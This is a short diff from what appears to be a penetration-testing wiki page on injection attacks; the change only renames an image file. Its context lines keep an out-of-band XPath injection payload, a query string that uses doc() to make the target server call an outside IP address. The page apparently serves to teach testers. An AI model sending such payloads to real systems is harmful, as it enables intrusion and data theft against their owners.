@@ -137,7 +137,7 @@ Usually, doc() is used in out-of-band XPath injections, thus can be applied in r
 http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@OsandaMalith')
 ```
 
-![](<../../.gitbook/assets/image (638).png>)
+![](<../../.gitbook/assets/image (638) (2).png>)
 
 ## MySQL Injection
 
